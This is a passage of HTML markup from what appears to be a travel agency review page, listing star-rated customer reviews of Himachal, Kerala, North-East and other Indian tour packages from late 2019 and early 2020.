                      <p style="margin:0px;">One of the bestest place i have ever visited. The weather, climate , sight , food everything was amazing. From my childhood days i always wanted to visit himachal trip and finally i got to do this year i have enjoyed my visit at this place the most and this was only possible just because of Mr. "Hitesh And Jagdish" because the services provided by them was the best.. My Trip My Way made our trip the luxrious and the comfortable one... I would highly recommend My Trip My Way for Himachal Tour Package..</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Shaikh Tabrez  for Himachal trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i>					  (5)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;13th, Jan 2020</small></h5>
                      <p style="margin:0px;">I enjoyed the trip.hotels and room are very good and safety and service is awesome</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Mayukh chakraborty  for North-East trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.2)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;11th, Jan 2020</small></h5>
                      <p style="margin:0px;">Best service provider in this price segment. I would specially like to thank Ms Arpita Saha who constantly kept touch with us right from the beginning of journey, she absolutely stands on her commitment. The hotels provided to us were palbhieu and salatrees, and I wanted to provide 5 star but for the second hotel i.e salatrees ,I am deducting one star. The room telephone was not working for which I had to run every time to their reception as every small things that we expect to be in the room was missing, tv was not working, electric kettle was not there, coffee sachet was missing etc. Anyways if I consider the whole holiday and my service provider provider Ms Arpita saha the experience was very good.if there is any provision for giving stars to the service provider I would like to give 5 star to Ms Arpita Saha</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Subah Parkar  for Himachal trip.</h3>
                      <h5 class="name" style="margin:0px;">
                                                (7)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;11th, Jan 2020</small></h5>
                      <p style="margin:0px;">The trip was good.. could have been better, but it wasnt bad overall.</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from ashutosh Dubey  for Himachal trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i>					  (5)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;11th, Jan 2020</small></h5>
                      <p style="margin:0px;">Well the facilities provided by the company was really nice. These 7 days are great for my life whether it's about management or comfort it's really great. The hotel staff was really great people to hangout and also the cab driver was very nice person to me because he helps me a lot. At last in future wherever I have to go i will try to contact tourist triangle for package at affordable prices. <br />
    Thank you</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from akshit  for Himachal trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i>					  (5)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;11th, Jan 2020</small></h5>
                      <p style="margin:0px;">very nice trip arrangement. must go with this.</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from SACHIN MHATRE  for Himachal trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i>					  (5)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;10th, Jan 2020</small></h5>
                      <p style="margin:0px;">It was fantastic... Everything planned was smooth and as per schedule.....<br />
    Karthik five stars... Is all yours.. Thanx a ton for superb vacation... </p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Sandeep singh  for Himachal trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i>					  (5)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;10th, Jan 2020</small></h5>
                      <p style="margin:0px;">Good trip</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Pradeep  for Himachal trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.8)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;10th, Jan 2020</small></h5>
                      <p style="margin:0px;">Dear Upasana,<br />
    <br />
    Thank you so much for giving me the best package to plan my trip to Kullu Manali, shimla and Agra for 7 Nights and 8 days. <br />
    <br />
    The nature and it's beauty of Himanchal cannot be explained....My 10 years old daughter enjoyed to the maximum though i fell sick for 2 days.<br />
    <br />
    Very pleasant hotel with nice food especially in Manali lovely view from my room.<br />
     <br />
    A hassle free trip right from planning the itinerary till the last day of my trip.<br />
    <br />
    Special thanks to Mr. Dilbagh the Driver who was very polite, drove very smoothly and was on time every day.<br />
    <br />
    Hope to have many more trips with Tech India Global Travels.<br />
    <br />
    Thanks & Regards,<br />
    Divya Pradeep</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Shashi Kiran V  for Himachal trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i>					  (5)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;8th, Jan 2020</small></h5>
                      <p style="margin:0px;">It was very well organized and we thoroughly enjoyed the continued support. </p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from PRATEEK PATEL   for Andaman trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.4)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;8th, Jan 2020</small></h5>
                      <p style="margin:0px;">Nice trip</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Dinesh   for Himachal trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.8)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;8th, Jan 2020</small></h5>
                      <p style="margin:0px;">Trip was really awesome and my family enjoyed a lot, the place I visited is really good , first time we saw the snow fall , my children enjoyed by playing in snow. Thanks for making our trip enjoyable</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Pathum  for Himachal trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.6)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;7th, Jan 2020</small></h5>
                      <p style="margin:0px;">Well organized trip. </p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Prasenjit Debnath  for Europe trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i>					  (5)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;7th, Jan 2020</small></h5>
                      <p style="margin:0px;">The trip was awesome..they provided best hotel,cab,food,bus's everything... Specialy thanks to #Neha'mam she was a very helpful person.I personally suggest if u r thinking or planning for Manali trip visit or contact that site...<br />
    Thanks Team </p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Prasenjit Debnath  for Himachal trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i>					  (5)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;6th, Jan 2020</small></h5>
                      <p style="margin:0px;">It was the gud trip and also my best memories... thanks #Sheetal'ji who guid every time,and her hospitality is awesome.<br />
    And again thanks to #Himachal_travel_way <br />
    If my relatives, friends or anybody comes and visit Manali then i always refar and suggest to contact ur site.<br />
    Thank you so much Ã°Å¸ËœÅ  for my happy trip</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Deepali  for Kashmir trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i>					  (5)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;6th, Jan 2020</small></h5>
                      <p style="margin:0px;">Trip was good </p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Priyanka  for Kerala trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.8)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;6th, Jan 2020</small></h5>
                      <p style="margin:0px;">Good arrangement done by executive of travel agency and touch with executive round the clock when ever is required by us. We enjoyed munnar and Alleppey trip</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Gitesh Purbia  for Kerala trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.4)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;5th, Jan 2020</small></h5>
                      <p style="margin:0px;">It was a good experience to kerela trip with travel setu. I have just completed the trip with my friend and overall good experience. Travel setu have very supporting staff and was in contact with first day. Thanks travel setu for this fantastic trip.</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Vikas Shah  for Himachal trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.8)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;4th, Jan 2020</small></h5>
                      <p style="margin:0px;">Overall great experience and good customer experience, my special thanks to Tanu. </p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Kunal  for Himachal trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i>					  (5)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;3rd, Jan 2020</small></h5>
                      <p style="margin:0px;">We enjoyed every moments of the tour. Arrangements are good. Travel company was very much co operative. </p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Sri Venkata Sai Mounica  for North-East trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.6)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;3rd, Jan 2020</small></h5>
                      <p style="margin:0px;">The trip was extremely good..thanks for planning our trip</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Dheeraj  for Himachal trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.4)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;3rd, Jan 2020</small></h5>
                      <p style="margin:0px;">It was a well organised trip</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Brijesh   for Himachal trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i>					  (5)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;3rd, Jan 2020</small></h5>
                      <p style="margin:0px;">Best facilities provided in package good supporting staff (Nitin sir)</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Shubham  for Kerala trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i>					  (5)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;31st, Dec 2019</small></h5>
                      <p style="margin:0px;">I will enjoy my trip driver hotels n my travel agent everything my experience was really good I will surely suggest to everyone thank you </p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Dhaval Kikani  for Rajasthan  trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.8)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;31st, Dec 2019</small></h5>
                      <p style="margin:0px;">It was great. special thanx to Mr.Kapil who was manage and cooperate  throughout the trip. Thank you for recently rajsthan trip make memorable.</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Suvidhya  for Kerala trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.6)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;31st, Dec 2019</small></h5>
                      <p style="margin:0px;">OUR KERALA TRIP WAS GOOD. SERVICES WAS ALSO FINE. </p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Umang  for Himachal trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.6)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;31st, Dec 2019</small></h5>
                      <p style="margin:0px;">thank you so munch to manali traveller for taking care all our needs, Just fantastic experience with your tour management . </p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Shashank Bhatt  for Kerala trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.6)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;28th, Dec 2019</small></h5>
                      <p style="margin:0px;">The staff was really friendly and helpful.</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Jyoti Chakma  for Himachal trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.4)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;27th, Dec 2019</small></h5>
                      <p style="margin:0px;">5 days four nights</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Gaurav Sharma   for Himachal trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.6)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;26th, Dec 2019</small></h5>
                      <p style="margin:0px;">Very good arrangement by travel setu </p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Jaya Krishna   for Kerala trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.4)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;26th, Dec 2019</small></h5>
                      <p style="margin:0px;">We are assisted by abhimanyu Kumar from on-time holidays. It was an amazing trip.we enjoyed a lot. The assistance was very nice. Time to time pickup and dropping. The resorts which were provided were nice. The driver was very cooperative. Overall very nice holiday trip packed with lot of memories.</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Ritesh  for Himachal trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i>					  (5)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;24th, Dec 2019</small></h5>
                      <p style="margin:0px;">A pretty Good hotel with enthusiastic staff. Beautiful, comfortable and well designed rooms. Hospitality and care was just too good.really enjoyed my stay.i will certainly be staying here again.would recommend this hotel.The rooms was cleaned,comfortable and well maintained.Staff was copretive, helpful and active. One of the best things was ala carte menu, it's so yummy tasty and fresh but beverage was limited..  Ambience was remarkable ..Last but not the least I would like to thanks upasana and team from tech india who fulfill our commitments which they have given at the time of first stage ...They are very professional and terms on Commitment ..<br />
    I wish all the best for their future projects .<br />
    <br />
    Thanks <br />
    Ritesh Khanna<br />
    </p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Jha  for North-East trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.4)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;23rd, Dec 2019</small></h5>
                      <p style="margin:0px;">Overall the journey was memorable. Thanks every one, especially quick response at peling and Darjeeling. But again i advice,. To get rid of some bad dogs who try to defame the good services.</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Lavanya  for Himachal trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.2)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;21st, Dec 2019</small></h5>
                      <p style="margin:0px;">We had a fantastic trip.thanks to travel setu for arranging smooth travel experience.special thanks to sharu and nithin for their co ordination during the trip. We have got good deal compared to other travel agencies.We have got comfortable volvo seats and we got zara resort in manali for stay. Resort location wise far from the mall road so we had to spend our evening in the hotel itself. One good thing about the resort is food was amazing in the zara resort and staff is very helpfull there.<br />
    The only discomfort i faced during the trip is only with my cab driver. He expedite us to spend minimal time at each loaction as he wants to drop us in the hotel at the earliest due to his personal works.he always requested us to finish the site seeing as soon as possible as he has some personal works to finish.<br />
    Except that the trip was amazing and once again thanks to sharu and nithin from tourist triangle.</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Rathan  for Himachal trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.8)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;20th, Dec 2019</small></h5>
                      <p style="margin:0px;">Everything is good.... satisfied </p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Mihir Bavisiya  for Himachal trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i>					  (5)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;18th, Dec 2019</small></h5>
                      <p style="margin:0px;">Good experience <br />
    Thank u travel setu </p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Anant Sudhakar  for Bhutan trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-o star"></i>					  (4)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;17th, Dec 2019</small></h5>
                      <p style="margin:0px;">Good</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Ravi  for Himachal trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i>					  (5)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;17th, Dec 2019</small></h5>
                      <p style="margin:0px;">Very nice Tour  and tour planer</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Vishal  for Himachal trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-o star"></i>					  (4)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;17th, Dec 2019</small></h5>
                      <p style="margin:0px;">Satisfied</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Rahul  for Himachal trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.6)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;14th, Dec 2019</small></h5>
                      <p style="margin:0px;">Himachal trip was awesome.Some misbehave with us by M P Residency hotel staff.. <br />
    Silicon Inn hotel is the best services provided with us.. . </p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Muskan chauhan  for Himachal trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i>					  (5)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;12th, Dec 2019</small></h5>
                      <p style="margin:0px;">Very very enjoying my trip amazing experience!</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from pradeep  for Himachal trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-o star"></i>					  (4)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;12th, Dec 2019</small></h5>
                      <p style="margin:0px;">Best Package in My Budget, and specially Thanks to Shalu Mem she is Suggest  Me Best Hotel,<br />
    and cab Driver is Also to Friendly Person, But your Volvo Bus that pickup from Delhi to manali is not Comfortable, Overall is good.      </p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Ashish  for North-East trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i>					  (5)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;9th, Dec 2019</small></h5>
                      <p style="margin:0px;">It was good trip</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Prachi  for Kerala trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.4)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;9th, Dec 2019</small></h5>
                      <p style="margin:0px;">I would strongly commend this agency for your any tour.<br />
    Thankyou for your services.</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from ASLAM   Khan for Himachal trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i>					  (5)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;5th, Dec 2019</small></h5>
                      <p style="margin:0px;">Hey .... firstly a big thanks to my trip my way & travels recently I had a tour with them MR .Jagdish assisted me the hotels booked were very good and specially the location was awesome the feeling was like we are in heaven our tour was for 5 nights and six days shimla kullu manali the travel company drafted itinerary in such    a manner that all the sights were covered yes there were some long journeys but they customizedvit such a way that it was not hectic at all also 5* to the food of the hotels I will suggest every to take the hotels with breakfast and  dinner you will breakfast and dinner you will have a great experience of north Indian food I just loved it we were 2 members in the family and all of we are very happy with the services provided by My Trip MY Way </p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Chris Calvin   for North-East trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.6)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;4th, Dec 2019</small></h5>
                      <p style="margin:0px;">I had a great experience at Sikkim last week. I had my first wedding anniversary. Right from the railway station, people from Tripps-n-trekks helped us to explore Sikkim. Luckily the agents made sure all reservations were correct. Incredibly it all came together well and we had a great weekend. Also we had incredible meal everywhere we went. Within two days we were able to visit almost all tourist spot and had a great anniversary celebrations in East Sikkim. All our conversations were transparent in WhatsApp. I will be planning to go to North Sikkim with the same team again.Ã°ÂŸÂ™ÂÃ°ÂŸÂÂ¼Ã°ÂŸÂ¤Â©</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Kashyap  for North-East trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i>					  (5)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;3rd, Dec 2019</small></h5>
                      <p style="margin:0px;">I visited Gangtok and Darjeeling for 6 days.<br />
    It was a great time there..<br />
    Hotels, Cars, drivers cum guides were decent and truely commendable.<br />
    Nice coordination. Value for money</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Patel Chirag Kumar n  for Kerala trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.8)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;24th, Nov 2019</small></h5>
                      <p style="margin:0px;">It's amazing Ã°ÂŸÂ˜ÂŽ tour </p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Akshay Jadhav  for Himachal trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.6)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;23rd, Nov 2019</small></h5>
                      <p style="margin:0px;">Nice service.. Enjoy himachal trip</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Rajalaxmi Nayak  for North-East trip.</h3>
                      <h5 class="name" style="margin:0px;">
